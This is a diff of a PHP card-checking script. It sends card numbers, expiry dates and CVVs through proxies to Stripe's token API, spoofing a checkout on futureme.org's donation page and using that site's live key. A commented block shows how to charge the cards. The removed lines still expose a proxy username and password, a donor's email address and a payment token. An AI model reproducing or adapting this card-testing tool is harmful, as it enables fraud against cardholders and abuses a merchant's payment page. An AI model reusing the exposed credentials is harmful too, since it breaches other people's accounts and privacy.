@@ -56,8 +56,8 @@ preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
 $postcode = $matches1[1][0];
 
 ////////////////////////////===[Luminati Details]
-$username = 'auto';
-$password = 'vDtA7foguwxENqZz2BbeFij4Y';
+$username = '';
+$password = '';
 $port = 8000;
 $session = mt_rand();
 $super_proxy = 'proxy.apify.com';
@@ -68,8 +68,8 @@ $ch = curl_init();
 //============================[Proxy_Apify]
 
 
-//curl_setopt($ch, CURLOPT_PROXY, "proxy.apify.com:8000");
-//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "auto:vDtA7foguwxENqZz2BbeFij4Y");
+//curl_setopt($ch, CURLOPT_PROXY, "");
+//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "");
 curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -79,7 +79,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept-encoding: gzip, deflate, br',
 'content-type: application/x-www-form-urlencoded',
 'origin: https://checkout.stripe.com',
-'referer: https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=ab6a92a1-f91b-1639-6d68-957940307538',
+'referer: https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=073b6928-2698-7ab7-36e3-86f6dba1aa8c',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-site'
 ));
@@ -90,13 +90,13 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fwww.futureme.org%2Fdonate&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]='.$name.'&time_on_page=13411&guid=95da8616-f593-4fdb-b65b-ee72d0a7cc56&muid=ccc513c7-0a1e-44ff-809b-380cc4d4efd3&sid=0119c1a8-0b67-4f13-96b5-66a02b2134d3&key=pk_live_9GV8Yezm7xiClB4kapZ2IN0r');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fwww.futureme.org%2Fdonate&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]='.$name.'&time_on_page=29432&guid=5de8767d-7feb-434c-b315-c3315228a77f&muid=5c002fbf-eda3-44e4-b7e1-bfa13b1003a2&sid=a1cdecfa-fed2-4dcc-82a2-2fbaffc2af1e&key=pk_live_9GV8Yezm7xiClB4kapZ2IN0r');
 
 echo $result = curl_exec($ch);
 ////////////////////////////===[For Charging Cards]-[If U Want To Charge Your Card Uncomment And Add Site]
 
 /*//$ch = curl_init();
-//curl_setopt($ch, CURLOPT_URL, 'https://www.futureme.org/payments/stripe.json');
+//curl_setopt($ch, CURLOPT_URL, '');
 //curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
@@ -106,10 +106,10 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'Host: www.futureme.org',
 'accept: text/plain, *//*; q=0.01',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'Origin: https://www.futureme.org',
-'referer: https://www.futureme.org/donate',
+'Origin: ',
+'referer: ',
 'Sec-Fetch-Mode: cors'));
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'stripeToken=tok_Gtuws5vWQ3pzym&stripeEmail=jordanti02%40gmail.com&recurring=false&donationAmount=500&path=%2Fdonate');
+curl_setopt($ch, CURLOPT_POSTFIELDS, '');
 
 echo $result = curl_exec($ch);
 $message = trim(strip_tags(getStr($result,'"message":"','"'))); 
